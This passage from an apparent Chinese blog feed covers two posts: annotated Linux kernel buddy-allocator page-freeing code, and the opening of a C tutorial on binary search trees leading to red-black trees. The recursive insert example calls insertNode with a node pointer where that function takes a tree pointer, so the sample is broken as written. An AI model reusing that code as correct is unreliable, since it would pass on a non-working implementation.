是否是一对</span></span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们的 buddy（译注：释放页面的“配对”页面，可以看开头的注释） 是空闲的</span></span><br><span class="line"><span class="comment"> * 或其为 CONFIG_DEBUG_PAGEALLOC 的 guard page，</span></span><br><span class="line"><span class="comment"> * 与其合并后升到高一级的order。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (page_is_guard(buddy))</span><br><span class="line">clear_page_guard(zone, buddy, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">del_page_from_free_list(buddy, zone, order);</span><br><span class="line">combined_pfn = buddy_pfn &amp; pfn;</span><br><span class="line">page = page + (combined_pfn - pfn);</span><br><span class="line">pfn = combined_pfn;</span><br><span class="line">order++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER - <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">/* 若我们到了这，这意味着 order &gt;= pageblock_order.</span></span><br><span class="line"><span class="comment"> * 我们想要预防在常规 pageblock 与独立的pageblock 之间的合并。</span></span><br><span class="line"><span class="comment"> * 没有这个，pageblock隔离可能造成错误的空闲页或CMA计数. </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 我们不想为了更频繁的低阶合并使用这个代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;</span><br><span class="line"><span class="type">int</span> buddy_mt;</span><br><span class="line"></span><br><span class="line">buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line">buddy = page + (buddy_pfn - pfn);</span><br><span class="line">buddy_mt = get_pageblock_migratetype(buddy);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (migratetype != buddy_mt</span><br><span class="line">&amp;&amp; (is_migrate_isolate(migratetype) ||</span><br><span class="line">is_migrate_isolate(buddy_mt)))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line">&#125;</span><br><span class="line">max_order = order + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">goto</span> continue_merging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done_merging:</span><br><span class="line">set_buddy_order(page, order); <span class="comment">// 在 page-&gt;private 中储存其 order</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是插到链表头还是链表尾</span></span><br><span class="line"><span class="keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)</span><br><span class="line">to_tail = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_shuffle_order(order))</span><br><span class="line">to_tail = shuffle_pick_tail();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 该函数会检查是否下一个最高阶的 buddy 是否空闲</span></span><br><span class="line">        <span class="comment">// 若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部</span></span><br><span class="line">        <span class="comment">// 这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</span></span><br><span class="line">to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入特定迁移链表</span></span><br><span class="line"><span class="keyword">if</span> (to_tail)</span><br><span class="line">add_to_free_list_tail(page, zone, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_to_free_list(page, zone, order, migratetype);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notify page reporting subsystem of freed page */</span></span><br><span class="line"><span class="keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))</span><br><span class="line">page_reporting_notify_free(order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们将与待释放页面凑成一对的内存块称为 buddy，所谓凑成一对便是<strong>这两个内存块在物理上连续，且能凑成一个更高一阶的大内存块</strong>，由此称之为一对 buddies</p><p>该函数主要流程如下：</p><ul><li>（continue_merging，循环开头）调用 <code>__find_buddy_pfn()</code> 计算待释放页面的 buddy 的第一张物理页的页框号，算法比较暴力：<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>调用 <code>page_is_buddy()</code> 检查 buddy 与 待释放页面是否是一对 buddies，若否，则跳到（done_merging），这里的检查需要满足四个要素：<ul><li>buddy 不在空洞中</li><li>buddy 在 buddy system 中（即 buddy 也是空闲内存块）</li><li>待释放页面与其 buddy 在同一个 zone 中</li><li>待释放页面与其 buddy 有着同样的阶（order）</li></ul></li><li>若 buddy 为 guard page，则调用 <code>clear_page_guard()</code> 清楚这个属性让其变成空闲页面，这里清除的操作是通过将 page 结构体的 private 字段置 0 实现的；若否，则说明是常规的空闲页面，调用 <code>del_page_from_free_list()</code> 将其脱链</li><li>此时我们的新的高阶内存块就完成合成了，接下来我们回到循环开头重新寻找这个合成的新内存块的 buddy，这个循环一直持续到 <code>max_order</code> （一般是10），作为下一次循环的页框号的计算方式是 <code>buddy_pfn &amp; pfn</code>，之后做指针运算 <code>page + (combined_pfn - pfn)</code> 找到对应的 page 结构体</li><li>若退出循环时的 order 满足 <code>order &lt; MAX_ORDER - 1</code> ，则调用 <code>has_isolate_pageblock()</code> 检查 zone 中是否有 isolate block，若是则进行相关操作（<del>这块代码还没看懂</del>），最后跳转回（continue_merging）；这一步主要是防止 isolate pageblock 与常规的 pageblock 发生合并</li><li>（done_merging）这一步主要是调用 <code>set_buddy_order()</code> 在 page 结构体的 private 字段存放该内存块的 order</li><li>若是设置了 <code>FPI_TO_TAIL</code> flag，则将 <code>to_tail</code> 置为 true；否则，若内存块的 <code>order &gt;= SHUFFLE_ORDER</code>（<code>MAX_ORDER - 1</code>），则将 <code>to_tail</code> 置为随机结果（<code>shuffle_pick_tail()</code>）；否则置为调用 <code>buddy_merge_likely()</code> 的结果，该函数会检查是否下一个最高阶的 buddy 是否空闲，若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部，这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</li><li>若 <code>to_tail</code> 为真，则调用 <code>add_to_free_list_tail()</code> 将该空闲页添加到链表末尾，否则调用 <code>add_to_free_list()</code> 添加到链表开头</li></ul><h2 id="二、上层封装函数"><a href="#二、上层封装函数" class="headerlink" title="二、上层封装函数"></a>二、<em>上层封装函数</em></h2><p>所有页面释放的函数其实都是对 <code>__free_one_page()</code> 的封装，最终都会调用到这个函数，路径如下：</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【ALGORITHM.0x04】从二叉搜索树开始手撕红黑树</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-05-30T04:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><strong>红黑树</strong>（red black tree）是自平衡二叉搜索树的一种，其特点在于能够高效地在插入与删除操作时实现自平衡，<strong>可以在 O(log N) 时间内完成查找、插入、删除</strong>，非常恐怖，<strong>相应地红黑树的实现代码也非常复杂</strong><del>，因此据传某大厂面试官为了刁难面试者就会天天考他们手撕红黑树</del></p><p>刚好笔者在阅读 Linux kernel 源码的过程中碰到不少使用到红黑树这一数据结构的地方（比如说 vma、task_struct…），此前也未深究过这一数据结构，所以今天来简单讲一讲如何从零开始手撕一棵红黑树；）</p><blockquote><p>会参考《算法导论（第三版）》，<strong>但是不会照抄上面的代码，主要还是借鉴思路</strong>；）</p><blockquote><p>当然，《算法导论》上面也只有伪代码</p></blockquote></blockquote><h2 id="Pre-二叉树节点定义"><a href="#Pre-二叉树节点定义" class="headerlink" title="Pre.二叉树节点定义"></a>Pre.二叉树节点定义</h2><p>这里还是用笔者最熟悉的 C 语言来定义一个二叉树：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> key;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们将一棵树定义如下，本质上就是根节点的 wrapper，不过这样可以方便我们更改根节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">root</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="0x01-二叉搜索树"><a href="#0x01-二叉搜索树" class="headerlink" title="0x01. 二叉搜索树"></a>0x01. 二叉搜索树</h1><p>我们先从二叉搜索树的基本概念讲起，顾名思义，一棵<strong>二叉搜索树</strong>（binary search tree）本质上是一棵二叉树，不过其多了额外的性质：</p><ul><li><em>设 x 为二叉搜索树中的一个节点：</em><ul><li><em>若 y 为 x 的左子树中的一个非空节点，则有 <code>y.key &lt;= x.key</code></em></li><li><em>若 y 为 x 的右子树中的一个非空节点，则有 <code>y.key &gt;= x.key</code></em></li></ul></li></ul><p>即一个节点的左子树中节点的值总小于等于该节点，右子树中节点的值总大于等于该节点，这便是二叉搜索树</p><h2 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h2><blockquote><p>查找基本上没有什么好讲的点，后面查找基本上也都是这个思路，所以这里讲完查找之后后面不会再重复叙述</p></blockquote><p>为什么叫搜索树呢？因为有了这个性质我们便很容易在整棵树当中寻找特定值的节点，例如从根节点开始搜索：</p><h3 id="递归查找"><a href="#递归查找" class="headerlink" title="递归查找"></a>递归查找</h3><ul><li>若当前节点为空或当前节点的值等于被搜寻值，返回结果</li><li>若当前节点的值大于被搜寻值，搜索当前节点的左子树</li><li>若当前节点的值小于被搜寻值，搜索当前节点的右子树</li></ul><p>有了以上算法我们很容易就能写出递归查找某节点的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">searchNode</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *root, <span class="type">size_t</span> dst_val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root || root-&gt;key == dst_val)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;key &gt; dst_val)</span><br><span class="line">        <span class="keyword">return</span> searchNode(root-&gt;left, dst_val);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> searchNode(root-&gt;right, dst_val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递推查找"><a href="#递推查找" class="headerlink" title="递推查找"></a>递推查找</h3><p>当然，若是树的深度太高，递归很容易爆栈（例如内核这种栈只有一两张内存页的场景），因此接下来我们将递归变递推：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">searchNode</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *root, <span class="type">size_t</span> dst_val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;key == dst_val)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;key &gt; dst_val)</span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            root = root-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h2><p>我们在插入节点时需要保证二叉搜索树依然是二叉搜索树，因此我们在插入时遵循如下算法，从根节点开始遍历：</p><ul><li>若待插入节点的值小于当前节点的值<ul><li>若左子树为空，则待插入节点成为当前节点的左孩子</li><li>若左子树非空，则继续插入到左子树中</li></ul></li><li>若待插入节点的值大于当前节点的值<ul><li>若右子树为空，则待插入节点成为当前节点的右孩子</li><li>若右子树非空，则继续插入到右子树中</li></ul></li><li>若待插入节点的值等于当前节点的值<ul><li><em>自定义操作</em></li></ul></li></ul><p>若出现待插入节点的值在这棵二叉搜索树中已经存在的情况，二叉搜索树对于这种情况并没有严格的定义，你可以选择为当前节点增加一个 count 成员然后++，亦或是什么也不做</p><h3 id="递归插入"><a href="#递归插入" class="headerlink" title="递归插入"></a>递归插入</h3><p>这里我们不直接用一个节点来插入，而是通过一层 wrapper 来进行插入（参见 pre 部分）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NODE_EXISTS -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertNode</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!tree-&gt;root)</span><br><span class="line">    &#123;</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> insertNodeRecursion(tree-&gt;root, node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertNodeRecursion</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *root, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;key &lt; node-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right = node;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> insertNode(root-&gt;right, node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;key &gt; node-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left = node;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> insertNode(root-&gt;left, node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">        <span class="keyword">return</span> NODE_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递推插入"><a href="#递推插入" class="headerlink" title="递推插入"></a>递推插入</h3><p>魔改的《算法导论》上的算法，递推遍历找到待插入位置，在遍历的过程中 <code>parent</code> 节点其实就是 <code>child</code> 的父节点，当 root 为 NULL 时说明找到了可插入位置，于是把待插入节点插到 <code>parent</code> 上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NODE_EXISTS -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertNode</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">child</span>;</span></span><br><span class="line">    </span><br><span class="line">    child = tree-&gt;root;</span><br><span class="line">    parent = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (child)</span><br><span class="line">    &#123;</span><br><span class="line">        parent = child;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;key &lt; child-&gt;key)</span><br><span class="line">            child = child-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;key &gt; child-&gt;key)</span><br><span class="line">            child = child-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> NODE_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// tree is mpty</span></span><br><span class="line">    <span class="keyword">if</span> (!parent)</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;key &lt; parent-&gt;key)</span><br><span class="line">        parent-&gt;left = node;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;key &gt; parent-&gt;key)</span><br><span class="line">        parent-&gt;right = node;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> NODE_EXISTS;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h2><p>我们需要在删除掉指定节点后保持这棵树仍是一棵二叉搜索树，因此删除节点比插入节点要稍微麻烦一点点</p><p>删除节点主要存在以下三种情况：</p><ul><li>待删除节点 x 没有子节点<ul><li>直接删除，父节点对应子树置NULL</li></ul></li><li>待删除节点 x 有一个子节点 y<ul><li>让 y 替代 x 原来的位置</li></ul></li><li>待删除节点 x 有两个子节点<ul><li>寻找 x 的后继节点 y，让 y 替代 x 原来的位置，x 原来的左右子树成为 y 的新的左右子树</li></ul></li></ul><blockquote><p>后继节点：二叉树中序遍历中当前节点的后一个节点</p></blockquote><p>第三种情况是比较复杂的，因为我们同时还需要考虑到 y 的位置，若 y 是 x 的右孩子，则直接让 y 上位替代 x 即可；若 y 不是 x 的右孩子，则 y 上位替代 x 之后由 y 的右孩子替代 y 的原位置（作为 z 的后继节点，y 必定没有左孩子）</p><p>在《算法导论》中最终将这三种情况按如下算法路径进行处理，对于待删除结点 x 而言：</p><ul><li>若 x 没有左孩子，则用其右孩子来替换 x（这个右孩子可以是 NULL，所以实际包含两种情况：仅有一右孩|无子结点）</li><li>若 x 仅有一个孩子且为左孩子，则用其左孩子来替换 x</li><li>若 x 同时有左右孩子，查找 x 的后继结点 y，将 y 移出原来的位置进行拼接，并替换树中的 x<ul><li>若 y 为 x 的右孩子，则直接用 y 替换 x</li><li>若 y 为 x 的右子树中结点，先用 y 的右孩子替换 y，之后用 y 替换 x</li></ul></li></ul><p><img src="https://s2.loli.net/2022/05/28/IodjvPEy2N1ZJfz.png" alt="算法导论上的图"></p><p>最后就是删除操作的代码实现了，这里注意后继节点的一些性质：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EMPTY_TREE -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">findParent</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">root</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!tree || tree-&gt;root == node)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    root = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == node || root-&gt;right == node)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;key &lt; node-&gt;key)</span><br><span class="line">            root = root-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">findSuccessor</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">successor</span>;</span></span><br><span class="line">    </span><br><span class="line">    successor = node-&gt;right;</span><br><span class="line">    <span class="keyword">while</span> (successor &amp;&amp; successor-&gt;left)</span><br><span class="line">        successor = successor-&gt;left;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> successor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">successor</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">successor_parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">dst_parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">replayer</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!tree || !tree-&gt;root)</span><br><span class="line">        <span class="keyword">return</span> EMPTY_TREE;</span><br><span class="line">    </span><br><span class="line">    dst_parent = findParent(tree, dst);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!dst-&gt;left) <span class="comment">// no left child, right to replace x</span></span><br><span class="line">    &#123;</span><br><span class="line">        replayer = dst-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!dst-&gt;right) <span class="comment">// only left child, left to replace x</span></span><br><span class="line">    &#123;</span><br><span class="line">        replayer = dst-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// both children exist</span></span><br><span class="line">    &#123;</span><br><span class="line">        successor = findSuccessor(dst);</span><br><span class="line">        successor_parent = findParent(tree, successor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dst != successor_parent) <span class="comment">// successor in dst&#x27;s right tree</span></span><br><span class="line">        &#123;</span><br><span class="line">            successor_parent-&gt;left = successor-&gt;right;</span><br><span class="line">            successor-&gt;right = dst-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        successor-&gt;left = dst-&gt;left;</span><br><span class="line">        replayer = successor;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// replace x</span></span><br><span class="line">    <span class="keyword">if</span> (!dst_parent)</span><br><span class="line">        tree-&gt;root = replayer;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dst == dst_parent-&gt;left)</span><br><span class="line">        dst_parent-&gt;left = replayer;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dst_parent-&gt;right = replayer;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-AVL树"><a href="#0x02-AVL树" class="headerlink" title="0x02. AVL树"></a>0x02. AVL树</h1><p><strong>AVL树</strong>（Adelson-Velsky and Landis 